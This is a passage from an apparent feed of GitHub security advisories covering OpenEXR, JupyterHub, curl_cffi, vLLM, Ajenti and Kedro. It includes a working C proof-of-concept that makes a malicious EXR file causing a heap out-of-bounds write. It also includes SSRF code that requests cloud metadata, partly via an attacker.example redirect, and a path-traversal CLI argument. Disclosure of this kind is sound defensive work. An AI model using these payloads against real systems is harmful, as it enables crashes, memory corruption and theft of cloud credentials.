The same pattern is present in the encoder path (ht_apply_impl), lines 431–432, where row0–row3 are read rather than written, producing an out-of-bounds read.</p>
<h3 id="poc">PoC</h3>
<p>The PoC generates a valid B44 scanline EXR file (268435456 × 9, single HALF channel) and immediately decodes it. During decompression, uncompress_b44_impl() computes <code>row0 += y * nx</code>, with y=8 and nx=268435456, the product exceeds INT_MAX, triggering a signed integer overflow that displaces row0 before the scratch buffer. The subsequent memcpy() writes to this invalid address, causing the crash. The generated file /tmp/poc_b44.exr can be replayed independently on any OpenEXR installation.</p>
<pre><code class="language-poc.cpp">#include &lt;openexr.h&gt;
#include &lt;inttypes.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define CHECK(call)                                                  
    do {                                                             
        exr_result_t _rv = (call);                                   
        if (_rv != EXR_ERR_SUCCESS) {                                
            fprintf(stderr, "%s failed (%d)\n", #call, (int)_rv);   
            goto fail;                                               
        }                                                            
    } while (0)

static void fill_blocks(uint8_t* out, uint64_t n) {
    for (uint64_t i = 0; i &lt; n; i++, out += 3) {
        out[0] = 0x00; out[1] = 0x00; out[2] = (13u &lt;&lt; 2);
    }
}

int main(void) {
    const int64_t  W      = 268435456;
    const int64_t  H      = 9;
    const char*    path   = "/tmp/poc_b44.exr";

    const uint64_t blocks = (uint64_t)(W / 4) * 2 + 1;
    const uint64_t psz    = blocks * 3;

    uint8_t* packed = (uint8_t*) malloc(psz);
    exr_context_t         ctxt   = NULL;
    exr_context_initializer_t cinit = EXR_DEFAULT_CONTEXT_INITIALIZER;
    int                   part   = -1;
    exr_chunk_info_t      cinfo;
    exr_decode_pipeline_t dec    = EXR_DECODE_PIPELINE_INITIALIZER;
    uint16_t              dummy  = 0;
    int                   ok     = 0;

    if (!packed) { fprintf(stderr, "malloc failed\n"); return 1; }
    fill_blocks(packed, blocks);

    CHECK(exr_start_write(&amp;ctxt, path, EXR_WRITE_FILE_DIRECTLY, &amp;cinit));
    CHECK(exr_add_part(ctxt, "scan", EXR_STORAGE_SCANLINE, &amp;part));
    CHECK(exr_initialize_required_attr_simple(
              ctxt, part, (int32_t)W, (int32_t)H, EXR_COMPRESSION_B44));
    CHECK(exr_add_channel(ctxt, part, "Y", EXR_PIXEL_HALF,
                          EXR_PERCEPTUALLY_LOGARITHMIC, 1, 1));
    CHECK(exr_write_header(ctxt));
    CHECK(exr_write_scanline_chunk(ctxt, part, 0, packed, psz));
    exr_finish(&amp;ctxt); ctxt = NULL;

    fprintf(stderr, "[*] wrote %s  W=%"PRId64" H=%"PRId64 "  packed=%"PRIu64" bytes\n", path, W, H, psz);


    CHECK(exr_start_read(&amp;ctxt, path, &amp;cinit));
    CHECK(exr_read_scanline_chunk_info(ctxt, 0, 0, &amp;cinfo));
    CHECK(exr_decoding_initialize(ctxt, 0, &amp;cinfo, &amp;dec));

    dec.channels[0].decode_to_ptr          = (uint8_t*)&amp;dummy;
    dec.channels[0].user_pixel_stride      = 2;
    dec.channels[0].user_line_stride       = dec.channels[0].width * 2;
    dec.channels[0].user_bytes_per_element = 2;
    dec.channels[0].user_data_type         = dec.channels[0].data_type;

    CHECK(exr_decoding_choose_default_routines(ctxt, 0, &amp;dec));
    dec.unpack_and_convert_fn = NULL; 

    fprintf(stderr, "[*] calling exr_decoding_run()h\n");
    fflush(stderr);


    CHECK(exr_decoding_run(ctxt, 0, &amp;dec));
    ok = 1;

fail:
    if (ctxt) { exr_decoding_destroy(ctxt, &amp;dec); exr_finish(&amp;ctxt); }
    free(packed);
    return ok ? 0 : 1;
}
</code></pre>
<h3 id="asan-trace">ASAN Trace</h3>
<pre><code>openexr/src/lib/OpenEXRCore/internal_b44.c:561:23: runtime error:
    signed integer overflow: 8 * 268435456 cannot be represented in type 'int'
    #0 in uncompress_b44_impl  internal_b44.c:561
    #1 in internal_exr_undo_b44  internal_b44.c:706
    #2 in decompress_data  compression.c:444
    #3 in exr_uncompress_chunk  compression.c:541
    #4 in exr_decoding_run  decoding.c:580
    #5 in main  poc.c:83

=================================================================
==PID==ERROR: AddressSanitizer: SEGV on unknown address 0x7fe65cfbc800
==PID==The signal is caused by a WRITE memory access.
    #0 in memcpy  (libc)
    #1 in uncompress_b44_impl  internal_b44.c:599
    #2 in internal_exr_undo_b44  internal_b44.c:706
    #3 in decompress_data  compression.c:444
    #4 in exr_uncompress_chunk  compression.c:541
    #5 in exr_decoding_run  decoding.c:580
    #6 in main  poc.c:83

SUMMARY: AddressSanitizer: SEGV — WRITE via memcpy in uncompress_b44_impl internal_b44.c:599
</code></pre>
<h3 id="impact">Impact</h3>
<p>A crafted B44 or B44A EXR file can cause an out-of-bounds write in any application that decodes it via exr_decoding_run(). 
Consequences range from immediate crash (most likely) to corruption of adjacent heap allocations (layout-dependent).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-h762-rhv3-h25v">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-h762-rhv3-h25v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34544">https://nvd.nist.gov/vuln/detail/CVE-2026-34544</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/commit/35e7aa35e22c1975606be86e859f31cc1fc598ee">https://github.com/AcademySoftwareFoundation/openexr/commit/35e7aa35e22c1975606be86e859f31cc1fc598ee</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8">https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.8</a></li>
<li><a href="https://github.com/advisories/GHSA-h762-rhv3-h25v">https://github.com/advisories/GHSA-h762-rhv3-h25v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h762-rhv3-h25v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T21:47:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterhub-ltiauthenticator] LTI JupyterHub Authenticator: Unbounded Memory Growth via Nonce Storage (Denial of Service)]]></title>
        <id>https://github.com/advisories/GHSA-8mxq-7xr7-2fxj</id>
        <link href="https://github.com/advisories/GHSA-8mxq-7xr7-2fxj"/>
        <updated>2026-04-03T21:42:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The LTI 1.1 validator stores OAuth nonces in a class-level dictionary that grows without bounds. Nonces are added before signature validation, so an attacker with knowledge of a valid consumer key can send repeated requests with unique nonces to gradually exhaust server memory, causing a denial of service.</p>
<h2 id="patches">Patches</h2>
<ul>
<li>upgrade jupyterhub-litauthenticator to 1.6.3</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/ltiauthenticator/security/advisories/GHSA-8mxq-7xr7-2fxj">https://github.com/jupyterhub/ltiauthenticator/security/advisories/GHSA-8mxq-7xr7-2fxj</a></li>
<li><a href="https://github.com/advisories/GHSA-8mxq-7xr7-2fxj">https://github.com/advisories/GHSA-8mxq-7xr7-2fxj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8mxq-7xr7-2fxj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-03T21:42:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[curl_cffi] curl_cffi: Redirect-based SSRF leads to internal network access in curl_cffi (with TLS impersonation bypass)]]></title>
        <id>https://github.com/advisories/GHSA-qw2m-4pqf-rmpp</id>
        <link href="https://github.com/advisories/GHSA-qw2m-4pqf-rmpp"/>
        <updated>2026-04-03T21:36:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>curl_cffi does not restrict requests to internal IP ranges, and follows redirects automatically via the underlying libcurl.</p>
<p>Because of this, an attacker-controlled URL can redirect requests to internal services such as cloud metadata endpoints. In addition, curl_cffi’s TLS impersonation feature can make these requests appear as legitimate browser traffic, which may bypass certain network controls.</p>
<h3 id="details">Details</h3>
<p>The issue comes from how curl_cffi handles outbound requests</p>
<ul>
<li>User-supplied URLs are passed directly to libcurl without checking whether they resolve to internal IP ranges (e.g., 127.0.0.1, 169.254.0.0/16).</li>
<li>Redirects are automatically followed (CURLOPT_FOLLOWLOCATION = 1) inside libcurl.</li>
<li>There is no validation of redirect destinations at the Python layer.</li>
</ul>
<p>This means that even if an application only allows requests to external URLs, an attacker can</p>
<ul>
<li>Provide a URL pointing to an attacker-controlled server</li>
<li>Return a redirect response pointing to an internal service</li>
<li>Have curl_cffi follow that redirect automatically</li>
</ul>
<p>As a result, internal endpoints (such as cloud instance metadata APIs) can be accessed.</p>
<p>Additionally, curl_cffi supports TLS fingerprint impersonation (e.g., impersonate="chrome"). In environments where outbound requests are filtered based on TLS fingerprinting, this can make such requests harder to detect or block</p>
<p>This behavior is similar to previously reported redirect-based SSRF issues such as CVE-2025-68616, where redirects allowed access to unintended internal resources.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Direct internal request</li>
</ol>
<pre><code>import curl_cffi
resp = curl_cffi.get("http://169.254.169.254/latest/meta-data/")
print(resp.text)
</code></pre>
<ol start="2">
<li>Redirect to internal service
Attacker server:</li>
</ol>
<pre><code>GET /test
→ 302 Location: http://169.254.169.254/latest/meta-data/
</code></pre>
<p>Victim code:</p>
<pre><code>import curl_cffi
resp = curl_cffi.get("https://attacker.example/test")
print(resp.text)
</code></pre>
<p>Result</p>
<ul>
<li>Initial request goes to attacker server</li>
<li>Redirect is returned</li>
<li>libcurl follows the redirect automatically</li>
<li>Internal metadata endpoint is accessed</li>
</ul>
<ol start="3">
<li>With TLS impersonation</li>
</ol>
<pre><code>import curl_cffi\
resp = curl_cffi.get(
    "https://attacker.example/test",
    impersonate="chrome")
</code></pre>
<p>In some environments, this may help the request bypass TLS-based filtering controls.</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can control the requested URL may be able to:</p>
<ul>
<li>Access internal network services</li>
<li>Reach cloud metadata endpoints and retrieve sensitive information</li>
<li>Bypass certain outbound filtering mechanisms (depending on environment)
This corresponds to CWE-918 Server-Side Request Forgery.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lexiforest/curl_cffi/security/advisories/GHSA-qw2m-4pqf-rmpp">https://github.com/lexiforest/curl_cffi/security/advisories/GHSA-qw2m-4pqf-rmpp</a></li>
<li><a href="https://github.com/advisories/GHSA-qw2m-4pqf-rmpp">https://github.com/advisories/GHSA-qw2m-4pqf-rmpp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qw2m-4pqf-rmpp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T21:36:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterhub] JupyterHub has an Open Redirect Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-3vff-hjqv-m7h8</id>
        <link href="https://github.com/advisories/GHSA-3vff-hjqv-m7h8"/>
        <updated>2026-04-03T21:36:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="affected-version">Affected Version</h2>
<p>JupyterHub &lt;= 5.4.3</p>
<h2 id="impact">Impact</h2>
<p>An open redirect vulnerability in JupyterHub &lt;=5.4.3 allows attackers to construct links which, when clicked, take users to the JupyterHub login page, after which they are sent to an arbitrary attacker-controlled site outside JupyterHub instead of a JupyterHub page, bypassing JupyterHub's check to prevent this.</p>
<h2 id="patches">Patches</h2>
<p>Upgrade to JupyterHub 5.4.4</p>
<h2 id="workarounds">Workarounds</h2>
<p>A deployment can apply filters on the Location header in a reverse proxy such as nginx/apache/traefik.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/jupyterhub/security/advisories/GHSA-3vff-hjqv-m7h8">https://github.com/jupyterhub/jupyterhub/security/advisories/GHSA-3vff-hjqv-m7h8</a></li>
<li><a href="https://github.com/advisories/GHSA-3vff-hjqv-m7h8">https://github.com/advisories/GHSA-3vff-hjqv-m7h8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3vff-hjqv-m7h8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-03T21:36:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oauthenticator] Auth0OAuthenticator has an Authentication Bypass via Unverified Email Claims]]></title>
        <id>https://github.com/advisories/GHSA-rrvg-cxh4-qhrv</id>
        <link href="https://github.com/advisories/GHSA-rrvg-cxh4-qhrv"/>
        <updated>2026-04-03T21:35:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An authentication bypass vulnerability in <code>oauthenticator</code> allows an attacker with an unverified email address on an Auth0 tenant to login to JupyterHub. When <code>email</code> is used as the usrname_claim, this gives users control over their username and the possibility of account takeover.</p>
<h3 id="impact">Impact</h3>
<p>This is an <strong>Authentication Bypass Vulnerability</strong>. Any Auth0 tenant leveraging the <code>Auth0OAuthenticator</code> mapping the <code>email</code> claim to the JupyterHub username is impacted. By default, Auth0 handles email verification as a user flag, not a hard block to authentication streams. If an attacker can register an account with the Auth0 tenant with an unverified email and knows the email of an existing user on the system, they can authenticate as that user.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>Upgrade oauthenticator to 17.4</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Check <code>email_verified</code> field in an <code>Authenticator.post_auth_hook</code> function</li>
<li>Do not use <code>email</code> as the username claim</li>
<li><a href="https://support.auth0.com/center/s/article/Enforce-Email-Verification-With-Sending-Email-After-Each-Denied-Access">Enforce email verification in auth0</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-rrvg-cxh4-qhrv">https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-rrvg-cxh4-qhrv</a></li>
<li><a href="https://support.auth0.com/center/s/article/Enforce-Email-Verification-With-Sending-Email-After-Each-Denied-Access">https://support.auth0.com/center/s/article/Enforce-Email-Verification-With-Sending-Email-After-Each-Denied-Access</a></li>
<li><a href="https://github.com/advisories/GHSA-rrvg-cxh4-qhrv">https://github.com/advisories/GHSA-rrvg-cxh4-qhrv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rrvg-cxh4-qhrv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T21:35:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: Unauthenticated OOM Denial of Service via Unbounded `n` Parameter in OpenAI API Server]]></title>
        <id>https://github.com/advisories/GHSA-3mwp-wvh9-7528</id>
        <link href="https://github.com/advisories/GHSA-3mwp-wvh9-7528"/>
        <updated>2026-04-03T15:35:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Denial of Service vulnerability exists in the vLLM OpenAI-compatible API server. Due to the lack of an upper bound validation on the <code>n</code> parameter in the <code>ChatCompletionRequest</code> and <code>CompletionRequest</code> Pydantic models, an unauthenticated attacker can send a single HTTP request with an astronomically large <code>n</code> value. This completely blocks the Python <code>asyncio</code> event loop and causes immediate Out-Of-Memory crashes by allocating millions of request object copies in the heap before the request even reaches the scheduling queue.</p>
<h3 id="details">Details</h3>
<p>The root cause of this vulnerability lies in the missing upper bound checks across the request parsing and asynchronous scheduling layers:</p>
<ol>
<li><strong>Protocol Layer:</strong>
In <code>vllm/entrypoints/openai/chat_completion/protocol.py</code>, the <code>n</code> parameter is defined simply as an integer without any <code>pydantic.Field</code> constraints for an upper bound.</li>
</ol>
<pre><code class="language-python">class ChatCompletionRequest(OpenAIBaseModel):
    # Ordered by official OpenAI API documentation
    # https://platform.openai.com/docs/api/reference/chat/create
    messages: list[ChatCompletionMessageParam]
    model: str | None = None
    frequency_penalty: float | None = 0.0
    logit_bias: dict[str, float] | None = None
    logprobs: bool | None = False
    top_logprobs: int | None = 0
    max_tokens: int | None = Field(
        default=None,
        deprecated="max_tokens is deprecated in favor of "
        "the max_completion_tokens field",
    )
    max_completion_tokens: int | None = None
    n: int | None = 1
    presence_penalty: float | None = 0.0
</code></pre>
<ol>
<li><strong>SamplingParams Layer (Incomplete Validation):</strong>
When the API request is converted to internal <code>SamplingParams</code> in <code>vllm/sampling_params.py</code>, the <code>_verify_args</code> method only checks the lower bound (<code>self.n &lt; 1</code>), entirely omitting an upper bounds check.</li>
</ol>
<pre><code class="language-python">    def _verify_args(self) -&gt; None:
        if not isinstance(self.n, int):
            raise ValueError(f"n must be an int, but is of type {type(self.n)}")
        if self.n &lt; 1:
            raise ValueError(f"n must be at least 1, got {self.n}.")
</code></pre>
<ol>
<li><strong>Engine Layer (The OOM Trigger):</strong>
When the malicious request reaches the core engine (<code>vllm/v1/engine/async_llm.py</code>), the engine attempts to fan out the request <code>n</code> times to generate identical independent sequences within a synchronous loop.</li>
</ol>
<pre><code class="language-python">        # Fan out child requests (for n&gt;1).
        parent_request = ParentRequest(request)
        for idx in range(parent_params.n):
            request_id, child_params = parent_request.get_child_info(idx)
            child_request = request if idx == parent_params.n - 1 else copy(request)
            child_request.request_id = request_id
            child_request.sampling_params = child_params
            await self._add_request(
                child_request, prompt_text, parent_request, idx, queue
            )
        return queue
</code></pre>
<p>   Because Python's <code>asyncio</code> runs on a single thread and event loop, this monolithic <code>for</code>-loop monopolizes the CPU thread. The server stops responding to all other connections (including liveness probes). Simultaneously, the memory allocator is overwhelmed by cloning millions of request object instances via <code>copy(request)</code>, driving the host's Resident Set Size (RSS) up by gigabytes per second until the OS <code>OOM-killer</code> terminates the vLLM process.</p>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability Type:</strong> Resource Exhaustion / Denial of Service</p>
<p><strong>Impacted Parties:</strong></p>
<ul>
<li>Any individual or organization hosting a public-facing vLLM API server (<code>vllm.entrypoints.openai.api_server</code>), which happens to be the primary entrypoint for OpenAI-compatible setups.</li>
<li>SaaS / AI-as-a-Service platforms acting as reverse proxies sitting in front of vLLM without strict HTTP body payload validation or rate limitations.</li>
</ul>
<p>Because this vulnerability exploits the control plane rather than the data plane, an unauthenticated remote attacker can achieve a high success rate in taking down production inference hosts with a single HTTP request. This effectively circumvents any hardware-level capacity planning and conventional bandwidth stress limitations.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-3mwp-wvh9-7528">https://github.com/vllm-project/vllm/security/advisories/GHSA-3mwp-wvh9-7528</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/37952">https://github.com/vllm-project/vllm/pull/37952</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/b111f8a61f100fdca08706f41f29ef3548de7380">https://github.com/vllm-project/vllm/commit/b111f8a61f100fdca08706f41f29ef3548de7380</a></li>
<li><a href="https://github.com/advisories/GHSA-3mwp-wvh9-7528">https://github.com/advisories/GHSA-3mwp-wvh9-7528</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3mwp-wvh9-7528</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-03T15:35:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ajenti-panel] Ajenti has an authorization bypass during custom package installation]]></title>
        <id>https://github.com/advisories/GHSA-73jv-44c3-j5p2</id>
        <link href="https://github.com/advisories/GHSA-73jv-44c3-j5p2"/>
        <updated>2026-04-03T03:57:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An authenticated user (using the <code>auth_users</code> plugin authentication method) could install a custom package even if this user is not superuser.</p>
<h3 id="patches">Patches</h3>
<p>This is fixed in the version 2.2.15. Users should upgrade to this version as soon as possible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ajenti/ajenti/security/advisories/GHSA-73jv-44c3-j5p2">https://github.com/ajenti/ajenti/security/advisories/GHSA-73jv-44c3-j5p2</a></li>
<li><a href="https://github.com/ajenti/ajenti/releases/tag/v2.2.15">https://github.com/ajenti/ajenti/releases/tag/v2.2.15</a></li>
<li><a href="https://github.com/advisories/GHSA-73jv-44c3-j5p2">https://github.com/advisories/GHSA-73jv-44c3-j5p2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-73jv-44c3-j5p2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T03:57:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kedro] Kedro has Arbitrary Code Execution via Malicious Logging Configuration]]></title>
        <id>https://github.com/advisories/GHSA-9cqf-439c-j96r</id>
        <link href="https://github.com/advisories/GHSA-9cqf-439c-j96r"/>
        <updated>2026-04-03T03:48:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This is a <strong>critical Remote Code Execution (RCE)</strong> vulnerability caused by unsafe use of <code>logging.config.dictConfig()</code> with user-controlled input.</p>
<p>Kedro allows the logging configuration file path to be set via the <code>KEDRO_LOGGING_CONFIG</code> environment variable and loads it without validation. The logging configuration schema supports the special <code>()</code> key, which enables arbitrary callable instantiation. An attacker can exploit this to execute arbitrary system commands during application startup.</p>
<hr>
<h3 id="patches">Patches</h3>
<p>The vulnerability is fixed by introducing validation that rejects the unsafe <code>()</code> factory key in logging configurations before passing them to <code>dictConfig()</code>.</p>
<h4 id="fixed-in">Fixed in</h4>
<ul>
<li>Kedro 1.3.0</li>
</ul>
<p>Users should upgrade to this version as soon as possible.</p>
<hr>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading is not immediately possible:</p>
<ul>
<li>Do not allow untrusted input to control the <code>KEDRO_LOGGING_CONFIG</code> environment variable  </li>
<li>Restrict write access to logging configuration files  </li>
<li>Avoid using externally supplied or dynamically generated logging configs  </li>
<li>Manually validate logging YAML to ensure it does not contain the <code>()</code> key</li>
</ul>
<p>These mitigations reduce risk but do not fully eliminate it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kedro-org/kedro/security/advisories/GHSA-9cqf-439c-j96r">https://github.com/kedro-org/kedro/security/advisories/GHSA-9cqf-439c-j96r</a></li>
<li><a href="https://github.com/advisories/GHSA-9cqf-439c-j96r">https://github.com/advisories/GHSA-9cqf-439c-j96r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cqf-439c-j96r</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-03T03:48:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[kedro] Kedro: Path Traversal in versioned dataset loading via unsanitized version string]]></title>
        <id>https://github.com/advisories/GHSA-6326-w46w-ppjw</id>
        <link href="https://github.com/advisories/GHSA-6326-w46w-ppjw"/>
        <updated>2026-04-03T03:46:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>_get_versioned_path()</code> method in kedro/io/core.py constructs filesystem paths by directly interpolating user-supplied version strings without sanitization. Because version strings are used as path components, traversal sequences such as ../ are preserved and can escape the intended versioned dataset directory.
This is reachable through multiple entry points: <code>catalog.load(..., version=...)</code>, <code>DataCatalog.from_config(..., load_versions=...)</code>, and the CLI via <code>kedro run --load-versions=dataset:../../../secrets</code>. An attacker who can influence the version string can force Kedro to load files from outside the intended version directory, enabling unauthorized file reads, data poisoning, or cross-tenant data access in shared environments.</p>
<h3 id="patches">Patches</h3>
<p>Yes. Fixed in kedro version 1.3.0. Users should upgrade to kedro &gt;= 1.3.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Validate version strings before passing them to DataCatalog or the CLI, ensuring they do not contain <code>..</code> segments, path separators, or absolute paths.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kedro-org/kedro/security/advisories/GHSA-6326-w46w-ppjw">https://github.com/kedro-org/kedro/security/advisories/GHSA-6326-w46w-ppjw</a></li>
<li><a href="https://github.com/kedro-org/kedro/pull/5442">https://github.com/kedro-org/kedro/pull/5442</a></li>
<li><a href="https://github.com/advisories/GHSA-6326-w46w-ppjw">https://github.com/advisories/GHSA-6326-w46w-ppjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6326-w46w-ppjw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T03:46:48.000Z</published>
    </entry>
</feed>